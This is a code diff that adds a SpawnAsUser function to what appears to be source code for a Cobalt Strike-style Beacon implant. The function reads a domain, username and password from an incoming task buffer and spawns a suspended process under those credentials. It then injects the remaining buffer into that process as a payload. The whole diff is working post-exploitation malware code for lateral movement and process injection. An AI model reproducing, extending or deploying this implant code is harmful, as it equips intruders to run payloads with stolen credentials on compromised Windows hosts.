@@ -1353,3 +1353,43 @@ BOOL SpawnAsUserInternal(BOOL x86, char* lpDomain, char* lpUsername, char* lpPas
 	SpawnToFix(x86, cmd);
 	return RunAsUserInternal(lpDomain, lpUsername, lpPassword, cmd, CREATE_SUSPENDED, lpProcessInfo);
 }
+
+void SpawnAsUser(char* buffer, int length, BOOL x86)
+{
+#define MAX_DOMAIN 1024
+#define MAX_USERNAME 1024
+#define MAX_PASSWORD 1024
+
+	datap* locals = BeaconDataAlloc(MAX_DOMAIN + MAX_USERNAME + MAX_PASSWORD);
+
+	char* domain = BeaconDataPtr(locals, MAX_DOMAIN);
+	char* username = BeaconDataPtr(locals, MAX_USERNAME);
+	char* password = BeaconDataPtr(locals, MAX_PASSWORD);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+
+	if (!BeaconDataStringCopySafe(&parser, domain, MAX_DOMAIN))
+		goto cleanup;
+
+	if (!BeaconDataStringCopySafe(&parser, username, MAX_USERNAME))
+		goto cleanup;
+
+	if (!BeaconDataStringCopySafe(&parser, password, MAX_PASSWORD))
+		goto cleanup;
+
+	PROCESS_INFORMATION pi;
+	if (SpawnAsUserInternal(x86, domain, username, password, &pi))
+	{
+		Sleep(100);
+
+		int size = BeaconDataLength(&parser);
+		char* data = BeaconDataBuffer(&parser);
+		BeaconInjectTemporaryProcess(&pi, data, size, 0, NULL, 0);
+	}
+
+	BeaconCleanupProcess(&pi);
+
+cleanup:
+	BeaconDataFree(locals);
+}
